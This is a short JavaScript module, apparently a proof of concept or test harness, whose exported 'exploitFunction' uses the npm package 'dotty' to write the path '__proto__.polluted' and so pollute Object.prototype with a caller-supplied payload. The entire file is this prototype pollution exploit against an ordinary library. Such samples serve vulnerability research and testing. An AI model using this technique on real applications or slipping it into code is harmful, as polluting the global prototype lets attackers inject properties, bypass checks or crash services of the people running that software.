function exploitFunction(payload) {
  const dotty = require("dotty");
  const target = {};
  dotty.put(target, "__proto__.polluted", payload["__proto__.polluted"]);
  
  return target;
}

module.exports = { exploitFunction };